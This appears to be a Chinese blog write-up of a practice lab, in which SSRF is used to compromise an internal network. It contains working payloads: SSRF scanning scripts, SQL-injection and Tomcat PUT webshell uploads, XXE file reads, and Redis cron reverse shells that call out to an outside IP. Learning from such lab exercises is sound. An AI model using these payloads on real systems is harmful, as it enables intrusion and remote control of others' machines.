+<p>这种用bp应该是筛选不出来的，所以只能写个脚本，刚开始写的时候没加多线程，发现太慢了，后面还是直接加了一个多线程，同时也发现我试了几种方法发现最后都会有漏扫或者是扫错的情况，这个问题后面再深究，那就只能慢慢等一下了</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alive_ips=[]</span><br><span class="line"></span><br><span class="line">url=<span class="string">&quot;http://156.238.233.93:8080/&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>,<span class="number">255</span>):</span><br><span class="line">    ip=<span class="string">&quot;172.72.0.&quot;</span>+<span class="built_in">str</span>(i)</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        r=requests.post(url,data=&#123;<span class="string">&quot;url&quot;</span>:<span class="string">f&quot;dict://<span class="subst">&#123;ip&#125;</span>/&quot;</span>&#125;,timeout=<span class="number">1.5</span>)</span><br><span class="line">        <span class="built_in">print</span>(ip+<span class="string">&quot;存活&quot;</span>)</span><br><span class="line">        alive_ips.append(ip)</span><br><span class="line">    <span class="keyword">except</span> requests.exceptions.Timeout:</span><br><span class="line">        <span class="built_in">print</span>(ip+<span class="string">&quot;未存活&quot;</span>)</span><br><span class="line">    time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> idx, ip <span class="keyword">in</span> <span class="built_in">enumerate</span>(alive_ips, <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>. <span class="subst">&#123;ip&#125;</span>存活&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>得到以下信息，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">1. 192.168.100.1存活</span><br><span class="line">2. 192.168.100.21存活</span><br><span class="line">3. 192.168.100.22存活</span><br><span class="line">4. 192.168.100.23存活</span><br><span class="line">5. 192.168.100.24存活</span><br><span class="line">6. 192.168.100.25存活</span><br><span class="line">7. 192.168.100.26存活</span><br><span class="line">8. 192.168.100.27存活</span><br><span class="line">9. 192.168.100.28存活</span><br><span class="line">10. 192.168.100.29存活</span><br></pre></td></tr></table></figure>
+
+<p><code>1</code>这台机器没有，所以就是九台机器，继续扫描一下常用端口，把脚本改改</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">alive_ips = [</span><br><span class="line">    <span class="string">&quot;192.168.100.21&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.22&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.23&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.24&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.25&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.26&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.27&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.28&quot;</span>,</span><br><span class="line">    <span class="string">&quot;192.168.100.29&quot;</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://156.238.233.93:8090/&quot;</span></span><br><span class="line">top_ports = [</span><br><span class="line">    <span class="number">21</span>, <span class="number">22</span>, <span class="number">23</span>, <span class="number">25</span>, <span class="number">80</span>, <span class="number">110</span>, <span class="number">135</span>, <span class="number">139</span>, <span class="number">143</span>,</span><br><span class="line">    <span class="number">443</span>, <span class="number">445</span>, <span class="number">993</span>, <span class="number">995</span>, <span class="number">1433</span>, <span class="number">1521</span>, <span class="number">3306</span>, <span class="number">3389</span>,</span><br><span class="line">    <span class="number">5432</span>, <span class="number">5900</span>, <span class="number">6379</span>, <span class="number">8000</span>, <span class="number">8080</span>, <span class="number">8443</span>,</span><br><span class="line">]</span><br><span class="line"></span><br><span class="line">results = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> alive_ips.copy():</span><br><span class="line">    <span class="keyword">for</span> port <span class="keyword">in</span> top_ports:</span><br><span class="line">        target = <span class="string">f&quot;<span class="subst">&#123;ip&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line">        r = requests.post(</span><br><span class="line">            url,</span><br><span class="line">            data=&#123;<span class="string">&quot;url&quot;</span>: <span class="string">f&quot;dict://<span class="subst">&#123;target&#125;</span>/&quot;</span>&#125;,</span><br><span class="line">        )</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;HTTP/1.1&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;target&#125;</span> 服务存活&quot;</span>)</span><br><span class="line">            results.append(target)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">f&quot;[+] <span class="subst">&#123;target&#125;</span> 服务不存活&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.3</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 打印最终结果</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;\n======= 存活服务列表 =======&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> idx, result <span class="keyword">in</span> <span class="built_in">enumerate</span>(results, <span class="number">1</span>):</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;idx&#125;</span>. <span class="subst">&#123;result&#125;</span>&quot;</span>)</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+<p>但是这个脚本探测不出来部分端口，手动一下就好了。不知道为什么会超时加载不出来</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">1. 192.168.100.21:80</span><br><span class="line">2. 192.168.100.22:80</span><br><span class="line">3. 192.168.100.23:80</span><br><span class="line">4. 192.168.100.24:80</span><br><span class="line">5. 192.168.100.25:80</span><br><span class="line">6. 192.168.100.26:8080</span><br><span class="line">7. 192.168.100.27:6379</span><br><span class="line">8. 192.168.100.28:6379\80</span><br><span class="line">9. 192.168.100.29:3306</span><br></pre></td></tr></table></figure>
+
+<h2 id="192-168-100-22RCE"><a href="#192-168-100-22RCE" class="headerlink" title="192.168.100.22RCE"></a>192.168.100.22RCE</h2><p>扫描一下发现</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.22/shell.php?1</span><br><span class="line">http://192.168.100.22/phpinfo.php?1</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>); </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">system</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>可以随便RCE了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.22/shell.php?cmd=ls</span><br><span class="line">http://192.168.100.22/shell.php?cmd=cat%20flag</span><br><span class="line">http://192.168.100.22/shell.php?cmd=ls%20/</span><br><span class="line">http://192.168.100.22/shell.php?cmd=cat%20/etc/hosts</span><br></pre></td></tr></table></figure>
+
+<p>可以查到hosts说明已经拿下这台机器</p>
+<h2 id="192-168-100-23sqli"><a href="#192-168-100-23sqli" class="headerlink" title="192.168.100.23sqli"></a>192.168.100.23sqli</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.23/?id=1</span><br></pre></td></tr></table></figure>
+
+<p>我一看怎么什么都没有，往下拉就看到了</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-111356.jpg" alt="1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3--+</span><br><span class="line">http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3,4--+</span><br><span class="line"></span><br><span class="line">http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3,load_file(&#x27;/etc/passwd&#x27;)--+</span><br><span class="line">http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3,load_file(&#x27;/etc/hosts&#x27;)--+</span><br><span class="line">##############################################</span><br><span class="line">	127.0.0.1	localhost</span><br><span class="line">::1	localhost ip6-localhost ip6-loopback</span><br><span class="line">fe00::0	ip6-localnet</span><br><span class="line">ff00::0	ip6-mcastprefix</span><br><span class="line">ff02::1	ip6-allnodes</span><br><span class="line">ff02::2	ip6-allrouters</span><br><span class="line">192.168.100.23	213c410b2987</span><br></pre></td></tr></table></figure>
+
+<p>有权限，直接写个马进去</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.23/?id=-1&#x27;union%20select%201,2,3,&#x27;&lt;?php%20system($_GET[1]);&#x27;%20into%20outfile%20&#x27;/var/www/html/2.php&#x27;--+</span><br><span class="line"></span><br><span class="line">http://192.168.100.23/2.php?1=ls</span><br></pre></td></tr></table></figure>
+
+<p>这台机器就被拿下了</p>
+<h2 id="192-168-100-24RCE"><a href="#192-168-100-24RCE" class="headerlink" title="192.168.100.24RCE"></a>192.168.100.24RCE</h2><p>这里需要命令执行</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.24/</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-112050.jpg" alt="1"></p>
+<p>很经典的截断RCE</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.24/?ip=127.0.0.1;ls</span><br></pre></td></tr></table></figure>
+
+<p>发现失败了，可能是POST传参，我们刚才已经拿到shell了，所以问题不大</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.100.23/2.php?1=curl http://192.168.100.24/ -d &#x27;ip=127.0.0.1;ls&#x27; -X POST</span><br></pre></td></tr></table></figure>
+
+<p>但是好像没有curl这台机器上面，所以还是得用SSRF的打法，将整个数据包选中然后url二次编码(不是二重编码)拼接到gopher协议后面，其中需要注意的点，</p>
+<ul>
+<li><code>Accept-Encoding: gzip, deflate</code>把这行删除，不然会出现乱码，因为被两次gzip编码了，</li>
+<li>需要抓一个正常的POST包，然后自己把<code>host</code>等类似的东西改掉，然后全选进行全编码(Convert selection-&gt;URL-&gt;URL-encode all characters )</li>
+</ul>
+<p>但是一直不好打，没打成功，那别怪我了，直接搭建内网代理，使用proxifier进行全局代理，来抓包就很简单了</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">./linux_x64_admin -l 1234 -s 123</span><br><span class="line"></span><br><span class="line">./linux_x64_agent -c 27.25.151.48:1234 -s 123 --reconnect 8</span><br><span class="line"></span><br><span class="line">use 0 </span><br><span class="line">socks 5555</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-124509.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-124644.jpg" alt="1"></p>
+<p>成功RCE，发现能够读取<code>hosts</code>这台机器拿下，因为每个人的数据包都不一样，所以我也不放出来了</p>
+<h2 id="192-168-100-25XXE"><a href="#192-168-100-25XXE" class="headerlink" title="192.168.100.25XXE"></a>192.168.100.25XXE</h2><p>用户登录用xml文档解析的直接打XXE，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">test</span> [</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///etc/passwd&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">password</span>&gt;</span>123<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-134621.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-134700.jpg" alt="1"></p>
+<h2 id="192-168-100-26Tomcat-8-5-19"><a href="#192-168-100-26Tomcat-8-5-19" class="headerlink" title="192.168.100.26Tomcat&#x2F;8.5.19"></a>192.168.100.26Tomcat&#x2F;8.5.19</h2><p>上传文件getshell即可，没错就是那个PUT上传文件的</p>
+<figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">PUT</span> <span class="string">/a.jsp/</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.100.26:8080</span><br><span class="line"><span class="attribute">Cache-Control</span><span class="punctuation">: </span>max-age=0</span><br><span class="line"><span class="attribute">Upgrade-Insecure-Requests</span><span class="punctuation">: </span>1</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/134.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9,en;q=0.8</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"><span class="attribute">Content-Type</span><span class="punctuation">: </span>application/x-www-form-urlencoded</span><br><span class="line"><span class="attribute">Content-Length</span><span class="punctuation">: </span>308</span><br><span class="line"></span><br><span class="line"><span class="language-gradle">&lt;%</span></span><br><span class="line"><span class="language-gradle"><span class="keyword">if</span>(<span class="string">&quot;023&quot;</span>.equals(request.getParameter(<span class="string">&quot;pwd&quot;</span>)))&#123;</span></span><br><span class="line"><span class="language-gradle">	java.io.InputStream in =<span class="keyword">Runtime</span>.getRuntime().exec(request.getParameter(<span class="string">&quot;i&quot;</span>)).getInputStream();</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">int</span> a = -<span class="number">1</span>;</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">byte</span>[] b = <span class="keyword">new</span> <span class="keyword">byte</span>[<span class="number">2048</span>];</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle">	<span class="keyword">while</span>((a=in.<span class="keyword">read</span>(b))!=-<span class="number">1</span>)&#123;</span></span><br><span class="line"><span class="language-gradle">		out.<span class="keyword">println</span>(<span class="keyword">new</span> String(b));</span></span><br><span class="line"><span class="language-gradle"> 	&#125;</span></span><br><span class="line"><span class="language-gradle">	out.<span class="keyword">print</span>(<span class="string">&quot;&lt;/pre&gt;&quot;</span>);</span></span><br><span class="line"><span class="language-gradle"> &#125;</span></span><br><span class="line"><span class="language-gradle">%&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>一样的打法，写入shell</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-135308.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-135345.jpg" alt="1"></p>
+<h2 id="192-168-100-27redis未授权"><a href="#192-168-100-27redis未授权" class="headerlink" title="192.168.100.27redis未授权"></a>192.168.100.27redis未授权</h2><p>系统没有 Web 服务（无法写 Shell），无 SSH 公私钥认证（无法写公钥），所以打算定时任务弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"># 清空 key</span><br><span class="line">dict://192.168.100.27:6379/flushall</span><br><span class="line"></span><br><span class="line"># 设置要操作的路径为定时任务目录</span><br><span class="line">dict://192.168.100.27:6379/config set dir /var/spool/cron/</span><br><span class="line"></span><br><span class="line"># 在定时任务目录下创建 root 的定时任务文件</span><br><span class="line">dict://192.168.100.27:6379/config set dbfilename root</span><br><span class="line"></span><br><span class="line"># 写入 Bash 反弹 shell 的 payload</span><br><span class="line">dict://192.168.100.27:6379/set x &quot;\n* * * * * /bin/bash -i &gt;%26 /dev/tcp/27.25.151.48/4444 0&gt;%261\n&quot;</span><br><span class="line"></span><br><span class="line"># 保存上述操作</span><br><span class="line">dict://192.168.100.27:6379/save</span><br></pre></td></tr></table></figure>
+
+<p>一定是在bp依次运行，网页在<code>save</code>时候会卡掉，就不能成功</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-140301.jpg" alt="1"></p>
+<p>这台机器也直接拿下</p>
+<h2 id="192-168-100-28redis授权"><a href="#192-168-100-28redis授权" class="headerlink" title="192.168.100.28redis授权"></a>192.168.100.28redis授权</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]); </span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;easy lfi&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>80端口可以包含文件，直接拿到密码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">/etc/redis.conf</span><br><span class="line">/etc/redis/redis.conf</span><br><span class="line">/usr/local/redis/etc/redis.conf</span><br><span class="line">/opt/redis/ect/redis.conf</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-140530.jpg" alt="1"></p>
+<p>由于dict只能一条命令一条命令的慢慢来，所以我们还是一次性写出来然后用gopher协议</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth P@ssw0rd</span><br><span class="line">flushall</span><br><span class="line">config set dir /var/spool/cron/</span><br><span class="line">config set dbfilename root</span><br><span class="line">set x &quot;\n* * * * * /bin/bash -i &gt;&amp; /dev/tcp/27.25.151.48/6666 0&gt;&amp;1\n&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p>进行两次url编码，其中最细节的就是<code>&amp;</code>符号，我最开始还是和dict协议一样写的<code>%26</code>但是后来进入docker发现了问题</p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143707.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143802.jpg" alt="1"></p>
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-143742.jpg" alt="1"></p>
+<p>这台机器也直接拿下了，还可以写入webshell，</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">auth P@ssw0rd</span><br><span class="line">flushall</span><br><span class="line">config set dir /var/www/html</span><br><span class="line">config set dbfilename shell.php</span><br><span class="line">set mars &quot;&lt;?=@eval($_POST[1]);?&gt;&quot;</span><br><span class="line">save</span><br><span class="line">quit</span><br></pre></td></tr></table></figure>
+
+<p><img src="/../images/achieve/2025/4/%E5%9B%BD%E5%85%89%E9%9D%B6%E5%9C%BASSRF%E6%89%93%E7%A9%BF%E5%86%85%E7%BD%91/QQ20250403-144633.jpg" alt="1"></p>
+<p>我这方法真的比现在公开的所有方法都简单吧，他们写的是这种</p>
+<ul>
+<li><p>+代表简单字符串（Simple Strings）比如OK，PONG（对应客户端的PING命令）</p>
+</li>
+<li><p>-代表错误类型（Errors）</p>
+</li>
+<li><p>:代表整型（Integers）</p>
+</li>
+<li><p>$代表多行字符串（Bulk Strings）</p>
+</li>
+<li><p>*代表数组（Arrays）</p>
+</li>
+</ul>
+<p>我认为是不太方便的</p>
+<h2 id="192-168-100-29未授权mysql"><a href="#192-168-100-29未授权mysql" class="headerlink" title="192.168.100.29未授权mysql"></a>192.168.100.29未授权mysql</h2><p>首先就是确实数据库里面有个flag，我们如果拿到shell之后可以</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">mysql -uroot</span><br><span class="line">show databases;</span><br><span class="line">use flag;</span><br><span class="line">show tables;</span><br><span class="line">select * from test;</span><br></pre></td></tr></table></figure>
+
+<p>但是此时不能getshell，并且得知一个事情，MySQL 需要密码认证时，服务器先发送 salt 然后客户端使用 salt 加密密码然后验证，但是当无需密码认证时直接发送 TCP&#x2F;IP 数据包即可</p>
+<p>但是但是这里有个最重要的点就是需要配合着去抓流量包，这个对于本web小子来说，暂时有些困难，所以这个坑先留着，后面一定填，并且是连着需要密码认证的时候一起说了</p>
+<p>这台机器后面需要UDF提权反弹shell，没什么好说的，老东西</p>
+<h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>学习的时候建议是搭建代理来进行的，不然有些时候抓的包他就是不对，就是需要重新来弄的，靶场非常简单，但是让我非常深刻的知道了gopher协议的使用，这个靶场可以魔改，让他变的更加有难度，有兴趣的师傅可以自己弄一</p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="reward-container">
+  <div>Buy me a coffee</div>
+  <button>
+    Donate
+  </button>
+  <div class="post-reward">
+      <div>
+        <img src="/images/wechat.png" alt="baozongwi reward">
+        <span>reward</span>
+      </div>
+
+  </div>
+</div>
+
+          
+
+<div class="post-copyright">
+<ul>
+  <li class="post-copyright-author">
+      <strong>Post author:  </strong>baozongwi
+  </li>
+  <li class="post-copyright-link">
+      <strong>Post link: </strong>
+      <a href="https://baozongwi.xyz/posts/3002ef95.html" title="国光靶场ssrf打穿内网">https://baozongwi.xyz/posts/3002ef95.html</a>
+  </li>
+  <li class="post-copyright-license">
+      <strong>Copyright Notice:  </strong>All articles in this blog are licensed under <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fab fa-fw fa-creative-commons"></i>BY-NC-SA</a> unless stating additionally.
+  </li>
